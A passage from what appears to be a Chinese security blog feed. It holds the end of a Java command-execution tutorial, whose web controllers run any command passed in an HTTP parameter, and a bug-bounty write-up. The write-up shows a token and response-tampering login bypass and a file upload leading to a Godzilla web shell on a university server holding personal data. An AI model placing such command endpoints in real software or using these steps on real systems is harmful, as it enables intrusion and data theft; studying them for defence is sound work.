title="java.lang.ProcessBuilder"></a>java.lang.ProcessBuilder</h3><p>​ProcessBuilder同样也是lang包中的一个类，这个类主要用于创建操作系统进程，此类两个重要且常用的方法<code>command()</code>和<code>start()</code></p><h4 id="command-start"><a href="#command-start" class="headerlink" title="command()+start()"></a>command()+start()</h4><p>​command()有四种重载形式，也都和exec大同小异，一种是可变的字符串，简单说就是可以传入普通字符串，或者字符串数组，另一种是字符串列表。有exec的案例，就不演示command()的重载了</p><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/6.png" alt="image-20240310153557809"></p><p>​start()用来执行通过command()设置的命令</p><p>​<strong>使用此方法执行命令流程：command()设置命令  &#x3D;&#x3D;》start()启动进程</strong></p><h5 id="java实现-2"><a href="#java实现-2" class="headerlink" title="java实现"></a>java实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//示例</span></span><br><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>();</span><br><span class="line">processBuilder.command(<span class="string">&quot;calc&quot;</span>); <span class="comment">//设置启动计算器的命令</span></span><br><span class="line">processBuilder.start();<span class="comment">//执行命令</span></span><br></pre></td></tr></table></figure><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/7.png" alt="image-20240310160038351"></p><h5 id="javaweb实现-1"><a href="#javaweb实现-1" class="headerlink" title="javaweb实现"></a>javaweb实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProcessBuilderController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/processBuilder&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processBuilder</span><span class="params">(String command, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>();</span><br><span class="line">        processBuilder.command(command);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">start</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(start.getInputStream(), Charset.*forName*(<span class="string">&quot;GBK&quot;</span>)));</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            out.print(line);</span><br><span class="line">        &#125;</span><br><span class="line">        bufferedReader.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url:http://localhost:8080/processBuilder?command=calc</span><br></pre></td></tr></table></figure><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/8.png" alt="image-20240310160418616"></p><h3 id="java-lang-ProcessImpl"><a href="#java-lang-ProcessImpl" class="headerlink" title="java.lang.ProcessImpl"></a>java.lang.ProcessImpl</h3><p>​这里就不赘述反射相关的知识了，不懂java反射的同学可以先去学下反射再来看</p><p>​在JDK9之前，它是两个类：<code>UNIXProcess</code>和<code>ProcessImpl</code>，JDK9之后就把它们俩合并到了一个类中了</p><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/9.png" alt="image-20240310161408091"></p><p>​ProcessImpl相对于其它两种就比较特殊了，ProcessImpl 是更为底层的实现，Runtime和ProcessBuilder执行命令实际上也是调用了ProcessImpl这个类，对于ProcessImpl，我们不能和其它两个类一样直接调用方法，java.lang.ProcessImpl 都被 private 封装起来了，并没有设置公共的 API 接口，只能<strong>通过反射调用</strong>。</p><h5 id="java实现-3"><a href="#java实现-3" class="headerlink" title="java实现"></a>java实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecProcessImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            String[] cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.*forName*(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(</span><br><span class="line">                <span class="string">&quot;start&quot;</span>,</span><br><span class="line">                String[].class,</span><br><span class="line">                Map.class,</span><br><span class="line">                String.class,</span><br><span class="line">                ProcessBuilder.Redirect[].class,</span><br><span class="line">                <span class="type">boolean</span>.class</span><br><span class="line">        );</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) method.invoke(<span class="literal">null</span>, cmds, <span class="literal">null</span>, <span class="string">&quot;.&quot;</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), Charset.*forName*(<span class="string">&quot;GBK&quot;</span>)));</span><br><span class="line">        <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/10.png" alt="image-20240310162820846"></p><h5 id="javaweb实现-2"><a href="#javaweb实现-2" class="headerlink" title="javaweb实现"></a>javaweb实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProcessImplController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/processImpl&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processImpl</span><span class="params">(String command, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;command&#125;;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.*forName*(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(</span><br><span class="line">                <span class="string">&quot;start&quot;</span>,</span><br><span class="line">                String[].class,</span><br><span class="line">                Map.class,</span><br><span class="line">                String.class,</span><br><span class="line">                ProcessBuilder.Redirect[].class,</span><br><span class="line">                <span class="type">boolean</span>.class</span><br><span class="line">        );</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process)method.invoke(<span class="literal">null</span>,cmds,<span class="literal">null</span>,<span class="string">&quot;.&quot;</span>,<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), Charset.*forName*(<span class="string">&quot;GBK&quot;</span>)));</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="keyword">while</span> ((line = bufferedReader.readLine())!= <span class="literal">null</span>)&#123;</span><br><span class="line">            writer.print(line);</span><br><span class="line">        &#125;</span><br><span class="line">        bufferedReader.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/11.png" alt="image-20240310163342400"></p><p>​到这里，java命令执行的基础就完毕了</p><h2 id="进阶-反射调用命令执行"><a href="#进阶-反射调用命令执行" class="headerlink" title="进阶-反射调用命令执行"></a>进阶-反射调用命令执行</h2><p>​</p><p>​通过反射来调用命令执行。</p><p>​因为三个命令执行类中，ProcessImpl只能通过反射调用 而且上述也已经演示，这里只讲述Runtime和ProcessBuilder。</p><h4 id="Runtime类"><a href="#Runtime类" class="headerlink" title="Runtime类"></a>Runtime类</h4><p>​Runtime类中 常用且简单粗暴的两种调用方法，<strong>getMethod()</strong>  、<strong>getDeclaredConstructor()</strong>  </p><h5 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod()"></a>getMethod()</h5><p>​获取一个类的一个public方法</p><p>​如下，通过反射调用Runtime类中的exec方法执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(clazz);</span><br><span class="line">        execMethod.invoke(runtime, <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​大家可能会发现，这里多了一个名为<code>getRuntime</code>方法，这是为什么？跟进到Runtime类可以得知</p><p>​<img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/12.png"></p><p>​橙色的锁在idea中表示private权限，也就是说Runtime类的构造器是私有的，因此不能直接使用<code>newInstance() </code>创建一个实例</p><p>​这个getRuntime又是什么，为什么需要用到这个方法来执行命令？</p><p>​跟进类源码可以看到</p><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/13.png" alt="image-20240311174705517"></p><p>​因为Runtime类是私有的，jdk提供了一个公开的静态getRuntime()方法，这个方法返回了一个私有的静态实例变量<code>currentRuntime</code>，并将其初始化为<code>new Runtime()</code>，也就是一个新的<code>Runtime</code>对象，然后再调用其exec()方法。这涉及到了<strong>”单例模式“</strong>这个概念，大概就是将类的构造函数设为私有，再通过静态方法来获取，以此来减少资源的消耗和启动时间。</p><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/14.png" alt="image-20240311180837386"></p><h5 id="getDeclaredConstructor"><a href="#getDeclaredConstructor" class="headerlink" title="getDeclaredConstructor()"></a>getDeclaredConstructor()</h5><p>​获得一个任意权限的构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    Class&lt;?&gt; clazz = Class.*forName*(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">    m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Method</span> <span class="variable">c1</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">    c1.invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/15.png" alt="image-20240311183403259"></p><p>​构造器就一个，且没有传递构造参数。</p><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/16.png" alt="image-20240311191043898"></p><h4 id="ProcessBuilder类"><a href="#ProcessBuilder类" class="headerlink" title="ProcessBuilder类"></a>ProcessBuilder类</h4><p>​相对于Runtime类，ProcessBuilder类携带了两个public的构造器：<strong>ProcessBuilder(List<String>)<strong>、</strong>ProcessBuilder(String)</String></strong></p><p>​直接通过newInstance()访问构造器，创建一个实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>));</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(object,<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​类中可以看到，给command属性传递了命令，然后再调用start()方法去执行命令</p><p>​<img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/17.png" alt="image-20240311192102761"></p><h2 id="end"><a href="#end" class="headerlink" title="end"></a>end</h2>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次SRC漏洞挖掘的Getshell</title>
      <link href="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/"/>
      <url>/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/</url>
      
        <content type="html"><![CDATA[<p><strong>注：微信公众号，csdn，freebuf原创以及本博客，都为我本人。</strong> 转载请邮件告知！</p><p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h2 id="挖src过程中一次巧妙的getshell"><a href="#挖src过程中一次巧妙的getshell" class="headerlink" title="挖src过程中一次巧妙的getshell"></a>挖src过程中一次巧妙的getshell</h2><p>直接打穿了某985高校，大概有惊人的五万多人的身份证人脸和个人信息数据…..</p><p>听朋友说某证书改版了，最近闲来无事，也刚好想换一个</p><p><img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/1.png" alt="9b748ba000a84cf688f02751ae539ca5"></p><p>最后一次交漏洞，这已经是2021年了，有漏洞次数但是rank还不够，直接开干</p><h3 id="START"><a href="#START" class="headerlink" title="START"></a>START</h3><p>​涉及敏感内容已经高度马赛克，逻辑漏洞+文件上传的绕过</p><h4 id="寻找目标"><a href="#寻找目标" class="headerlink" title="寻找目标"></a>寻找目标</h4><p>​举例：</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/2.png" alt="在这里插入图片描述"></p><p>​这个语法简单粗暴，是我平时用过最多的了</p><p>​<strong>首先说一下这种语法的优与劣(个人经验，是否正确因人而异)：</strong></p><p>​<strong>好处</strong></p><ul><li>​可以发现目标的ip站点，就是比如标题是xxxx管理，ip:22.22.22.22类似这种，因为平常域名防护的话是比较好的(不绝对)，ip就不如，而且ip直接绕过了云waf，包括c段，扫端口(留意是不是云服务器)，也比域名的方便，况且拿到域名有时候还要找到真实ip不是吗？例如↓</li></ul><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/3.png" alt="在这里插入图片描述"></p><p><em>如果你用host domain之类的语法 就是针对于域名的搜索了，不是很容易发现ip的资产</em></p><p>​<strong>坏处</strong></p><ul><li>​最重要的就是会 偏离攻击目标 也就是打偏，刚开始的朋友比较容易犯这个错误，大佬装看不到，例如↓<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/4.png" alt="在这里插入图片描述"></li></ul><p>​比如这种，只是一些引流的广告，把同济当标题的一个噱头，或者说一些报考院校咨询站的标题 之类的，如下↓就是目标外的站点</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/5.png" alt="在这里插入图片描述"></p><p>​这样的话用title岂不是浪费了自己的精力和时间，大家在实战中一定要信息观察，避免白忙活。</p><p>​还有呢就是body的语法，这个筛选难度太复杂，就不说了。</p><p>​简而言之，打点或者说是搜集资产，<strong>尽量使用多个语法配合逻辑符拼接整合，去搜索和筛选</strong>，这样以确保收集的站点更全更多。</p><p>​</p><h4 id="锁定目标"><a href="#锁定目标" class="headerlink" title="锁定目标"></a>锁定目标</h4><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/6.png" alt="在这里插入图片描述"></p><p>​爽，一眼有</p><p>​看到这种目标，首先分析一下指纹</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/7.png" alt="在这里插入图片描述"></p><p>​vue前端框架，看到这种框架，就看一下源码，一般前端信息特别特别多的</p><p>​然后就去测试未授权，看js，抓包看接口之类的漏洞，至少我遇到的vue百分之七八十或多或少都有不同程度的逻辑漏洞和未授权，涉及到了一个路由守卫的东西<br>​因为已经验证有漏洞， 多余的就不赘述。</p><h4 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h4><h5 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h5><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/8.png" alt="在这里插入图片描述"></p><p>​留意一下token是空</p><p><img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/9.png" alt="9"></p><p>​返回包1改成0。</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/10.png" alt="在这里插入图片描述"></p><p>​进去一瞬间，然后直接弹出来，拦截不放包的话也是不能点那些功能的，不拦截就闪退。</p><p>​当时对js看了很久，但是没有截图就不细说了。</p><p>​重新抓包测试</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/11.png" alt="在这里插入图片描述"></p><p>​这次发现 token默认有了一个值 undefined 也就是未赋值的声明。</p><p>​然后重复改包1变成0，居然发现不闪退了。</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/12.png" alt="在这里插入图片描述"></p><h5 id><a href="#" class="headerlink" title></a></h5><p>​猜测是token起码是要有一个值的，<strong>undefined也是一个值，这里应该是设计有逻辑缺陷，按理说未赋值undefined不应该作为一个值，这里token不能是空的，黑盒测试嘛，就是大胆猜一猜，</strong>我的推测是这样的，空就主页面闪退，有值的话主页不闪退，功能点触发再去鉴定这个token是否正确。</p><p>​f12给它一个值</p><p>​<strong>至于为什么随便赋一个值，而不去使用undefined呢，我就是担心万一后端有”!&#x3D;”这种 对undefined的检测</strong></p><p><img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/13.png" alt="在这里插入图片描述"></p><p>​然后改包进入，居然可以随便点点点了，不再去闪退到登录。</p><p>​点击这个查看活动</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/14.png" alt="在这里插入图片描述"></p><p>​</p><p>​抓包，看到我添加的token&#x3D;yydz了</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/15.png" alt="在这里插入图片描述"></p><p>​看一下返回包，触发闪退，这里和前面的猜测差不多，触发功能点时再去验证token的正确与否</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/16.png" alt="在这里插入图片描述"></p><p>​显然错误的token会提示未登录，返回值是1就直接闪退到登录界面，所以改0 留下来</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/17.png" alt="在这里插入图片描述"></p><h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><p>​上传一个html</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/18.png" alt="在这里插入图片描述"></p><p>​成功了</p><p>​访问返回的路径就可以了</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/19.png" alt="在这里插入图片描述"></p><p>​接着上传一个phpinfo()试试，为什么是php，因为前面的指纹信息已经告诉了 ，以及返回包的apache信息</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/20.png" alt="在这里插入图片描述"></p><p>​看一眼禁用函数</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/21.png" alt="在这里插入图片描述"></p><p>​头晕这种，这个时候哥斯拉就用上了</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/22.png" alt="在这里插入图片描述"></p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/23.png" alt="在这里插入图片描述"></p><p>​连接</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/24.png" alt="在这里插入图片描述"></p><p>​直接getshell，有着很多的信息，貌似规模非常的大，这里就不继续横向了，点到为止</p><p>​然后换证书的时候…这下白忙活了，怪我当时没细心看兑换限制，只能换个别的咯</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/25.png" alt="在这里插入图片描述"></p><h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h3><ul><li>首先就是运气成分</li><li>还有就是多试一试，不要去感觉这没有那没有，试了就有成功的可能，别嫌麻烦</li><li>然后利用Vue这种框架的一些特性，前端决定的信息太多，结合js多多分析。</li><li>最后就是多多实战，积累经验</li></ul><h2 id="end"><a href="#end" class="headerlink" title="end"></a><em><strong>end</strong></em></h2>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>又一个在野0day</title>
      <link href="/2023/03/07/%E5%8F%88%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/"/>
      <url>/2023/03/07/%E5%8F%88%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/</url>
      
